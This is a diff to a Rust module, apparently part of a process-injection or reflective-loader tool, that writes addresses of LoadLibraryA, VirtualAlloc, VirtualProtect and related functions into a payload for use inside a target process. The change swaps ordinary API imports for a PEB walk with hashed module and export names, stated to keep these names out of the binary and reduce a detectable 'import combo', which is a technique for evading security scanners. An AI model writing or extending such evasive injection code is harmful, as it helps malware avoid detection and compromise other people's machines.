@@ -6,14 +6,15 @@
 //! PEB.Ldr traversal. Validity relies on KnownDlls + session-consistent ASLR:
 //! kernel32 and ntdll share addresses across processes spawned in the same
 //! boot session.
+//!
+//! The five addresses are now resolved via [`crate::resolve`] — a PEB walk +
+//! in-memory export scan with hashed names — so the binary no longer imports
+//! `GetModuleHandleA`/`GetProcAddress` (wave-2 import-combo reduction).
 
-use std::ffi::CString;
 use std::fmt;
 
-use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-use windows::core::PCSTR;
-
 use crate::payload;
+use crate::resolve::{api, hash_bytes, hash_mod_bytes};
 
 /// Patch failure — all variants carry enough context to tell a corrupt payload
 /// from a broken toolchain.
@@ -41,24 +42,15 @@ impl fmt::Display for PatchError {
 
 impl std::error::Error for PatchError {}
 
-/// Raw address of an export inside a system DLL, resolved in OUR process — the
-/// same value Bootstrap uses inside the target (KnownDlls ASLR; Go: `winapi.Addr*`).
-/// Doesn't declare the export types; GetProcAddress returns the address value.
-fn module_export_addr(module_name: &[u8], export: &[u8]) -> Option<usize> {
-    let name_c = CString::new(export).ok()?;
-    // SAFETY: module_name is a static, NUL-terminated DLL name ("kernel32.dll"
-    // / "ntdll.dll" — both are loaded in every Windows process). GetModuleHandleA
-    // returns the handle or fails; the handle is valid for the process lifetime.
-    let hmod = unsafe { GetModuleHandleA(PCSTR(module_name.as_ptr().cast())) }.ok()?;
-    if hmod.is_invalid() {
-        return None;
-    }
-    // SAFETY: GetProcAddress returns a pointer to the export or NULL; both are
-    // stable for the process lifetime. Only the address VALUE is used (the
-    // pointee is never touched from our process). FARPROC is Option<fn> in
-    // windows-rs 0.62 — map it to a raw address (None → unresolved).
-    let addr = unsafe { GetProcAddress(hmod, PCSTR(name_c.as_ptr().cast())) };
-    addr.map(|f| f as usize)
+// Module hashes are precomputed at compile time from byte literals so the DLL
+// names never reach the image as strings. Export names are kept in `SPECS`
+// only because `PatchError::MissingImport` reports them.
+const MOD_KERNEL32: u32 = hash_mod_bytes(b"kernel32.dll");
+const MOD_NTDLL: u32 = hash_mod_bytes(b"ntdll.dll");
+
+/// Resolve one export address by hashed names (no strings in the binary).
+fn module_export_addr(module_hash: u32, export: &str) -> Option<usize> {
+    api(module_hash, hash_bytes(export.as_bytes()))
 }
 
 /// Port of `patchPreresolvedImports`: copy `payload` and write the five
@@ -69,16 +61,16 @@ pub fn patch_preresolved_imports(payload: &[u8]) -> Result<Vec<u8>, PatchError> 
         return Err(PatchError::TooSmall(payload.len()));
     }
 
-    const SPECS: [(&[u8], &str); 5] = [
-        (b"kernel32.dll\0", "LoadLibraryA"),
-        (b"kernel32.dll\0", "GetProcAddress"),
-        (b"kernel32.dll\0", "VirtualAlloc"),
-        (b"kernel32.dll\0", "VirtualProtect"),
-        (b"ntdll.dll\0", "NtFlushInstructionCache"),
+    const SPECS: [(&str, u32); 5] = [
+        ("LoadLibraryA", MOD_KERNEL32),
+        ("GetProcAddress", MOD_KERNEL32),
+        ("VirtualAlloc", MOD_KERNEL32),
+        ("VirtualProtect", MOD_KERNEL32),
+        ("NtFlushInstructionCache", MOD_NTDLL),
     ];
     let mut addrs = [0usize; 5];
-    for (i, (module, export)) in SPECS.iter().enumerate() {
-        let Some(addr) = module_export_addr(module, export.as_bytes()) else {
+    for (i, (export, module)) in SPECS.iter().enumerate() {
+        let Some(addr) = module_export_addr(*module, export) else {
             return Err(PatchError::MissingImport(export));
         };
         addrs[i] = addr;
@@ -108,19 +100,11 @@ mod tests {
     fn resolved_addresses_are_nonzero_in_this_process() {
         // The ASLR/KnownDlls contract is machine-local; on the dev box these
         // five addresses must resolve before anything is spawned.
-        for (name, exp) in [
-            (b"kernel32.dll\0".as_slice(), "LoadLibraryA".as_bytes()),
-            (b"kernel32.dll\0".as_slice(), "GetProcAddress".as_bytes()),
-            (b"kernel32.dll\0".as_slice(), "VirtualAlloc".as_bytes()),
-            (b"kernel32.dll\0".as_slice(), "VirtualProtect".as_bytes()),
-            (
-                b"ntdll.dll\0".as_slice(),
-                "NtFlushInstructionCache".as_bytes(),
-            ),
-        ] {
-            let addr = module_export_addr(name, exp);
-            assert!(addr.is_some() && addr.unwrap() != 0, "{exp:?} unresolved");
-        }
+        assert!(module_export_addr(MOD_KERNEL32, "LoadLibraryA").is_some());
+        assert!(module_export_addr(MOD_KERNEL32, "GetProcAddress").is_some());
+        assert!(module_export_addr(MOD_KERNEL32, "VirtualAlloc").is_some());
+        assert!(module_export_addr(MOD_KERNEL32, "VirtualProtect").is_some());
+        assert!(module_export_addr(MOD_NTDLL, "NtFlushInstructionCache").is_some());
     }
 
     #[test]
